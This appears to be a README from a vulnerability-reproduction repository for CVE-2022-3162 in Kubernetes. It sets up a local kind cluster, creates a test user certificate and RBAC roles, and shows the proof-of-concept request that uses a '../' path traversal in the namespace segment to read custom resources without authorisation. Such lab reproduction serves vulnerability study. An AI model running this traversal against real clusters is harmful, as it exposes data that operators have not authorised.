# CVE-2022-3162

## Experiment Environment

linux/amd64

kind  v0.14.0

kubectl  v1.24.4

kubernetes  v1.24.0

## Description

​	A security issue was discovered in Kubernetes where users authorized to list or watch one type of namespaced custom resource cluster-wide can read custom resources of a different type in the same API group without authorization.

​	当用户被授权去list或者watch一类命名的资源对象时，能够不通过授权获取同组的另一类对象。



## INSTALL & Configuration

```sh
```

## Pocs

```sh
kubectl apply -f foos-crd.yaml
kubectl apply -f goos-crd.yaml
kuebctl apply -f foo-cr.yaml
kuebctl apply -f goo-cr.yaml
```

```sh
kubectl get --raw "/apis/samplecontroller.k8s.io/v1alpha1/namespaces/../foos"
```

```
/registry/group/kind/{namespaces}/{name}
```

### create new user

```sh
openssl genrsa -out cve3162.key 2048
openssl req -new -key cve3162.key -out cve3162.csr -subj "/CN=cve3162/O=cves"

// 找到kubernetes集群的CA
openssl x509 -req -in cve3162.csr -CA /etc/kubernetes/pki/ca.crt -CAkey /etc/kubernetes/pki/ca.key -CAcreateserial -out cve3162.crt -days 500
```

```sh
kubectl config set-credentials cve3162 --client-certificate=cve3162.crt  --client-key=cve3162.key

kubectl config set-context cve3162-context --cluster=kind --namespace=kube-system --user=cve3162
```

```sh
kubectl get pods --context=cve3162-context
```

### apply ClusterRole and ClusterRoleBinding

```sh
kubectl apply -f ClusterRole.yaml
kubectl apply -f ClusterRoleBinding.yaml
```

### result

```sh
kubectl get --raw "/apis/samplecontroller.k8s.io/v1alpha1/namespaces/../foos" --context=cve3162-context
```

```sh
kubectl get --raw "/apis/samplecontroller.k8s.io/v1alpha1/namespaces/../goos" --context=cve3162-context
```

## Vulnerability Details & Patch

### Root Cause

## Reference

https://github.com/kubernetes/kubernetes/issues/113756



